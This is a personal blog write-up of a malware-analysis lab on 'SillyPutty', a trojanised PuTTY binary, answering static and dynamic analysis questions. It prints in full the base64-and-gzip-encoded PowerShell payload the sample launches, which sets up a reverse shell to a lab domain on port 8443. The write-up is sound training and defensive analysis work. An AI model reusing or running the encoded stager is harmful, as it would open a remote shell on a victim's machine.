---
title: SillyPutty
author: siresire
date: 2023-11-28 18:10:00 +0800
categories: [Malware]
tags: [PEStudio,PEview]
render_with_liquid: false
---


# Challenge Questions:

## Basic Static Analysis
### What is the SHA256 hash of the sample?

used the following command in powershell

```yaml
Get-FileHash .\putty.exe -Algorithm SHA256
```
![Alt text](/assets/img/malware/s1.png)

### What architecture is this binary?

I checked the binary architecture using PEStudio which was a 32 bit version
![Alt text](/assets/img/malware/s2.png)


### Are there any results from submitting the SHA256 hash to VirusTotal?
yes

![Alt text](/assets/img/malware/s4.png)

###  Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?
### Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?

![Alt text](/assets/img/malware/s5.png)

Nothing there was peculiar

### Is it likely that this binary is packed?
-It's not packed binary 
![Alt text](/assets/img/malware/s3.png)
By comparing the hexadecimal of the Virtual size and the size of the Raw data, The difference wasn’t much much

## Basic Dynamic Analysis

### Describe initial detonation. Are there any notable occurrences at first detonation? 
- Without internet simulation? 
We do get a normal puddy window and ostensibly we could put anything we want but if you double click again you do a blue flash window that pops up flash
- With internet simulation?
still the same as without the internet simulation
### From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?

> Using procmon 
 we can see a gigantic onliner powershell command line here after we filter the PID section 
![Alt text](/assets/img/malware/s6.png)

```yaml
H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4
S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGF
uCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp
2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHw
d7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC
/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCkt
lcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQ
JhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA==
```

after the conversion is from base64 and from gzip

![Alt text](/assets/img/malware/s7.png)

### What is the DNS record that is queried at detonation?

`bonus2.corporatebonusapplication.local`

![Alt text](/assets/img/malware/s8.png)

###  What is the callback port number at detonation?
> 8443
![Alt text](/assets/img/malware/s9.png)
### How can you use host-based telemetry to identify the DNS record, port, and protocol?

we addes the dns to the hosts file 
![Alt text](/assets/img/malware/s10.png)


###  Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?
Tried a netcat and had this shell but flushed the dns first

```yaml
ipconfig /flushdns
```
![Alt text](/assets/img/malware/s11.png)
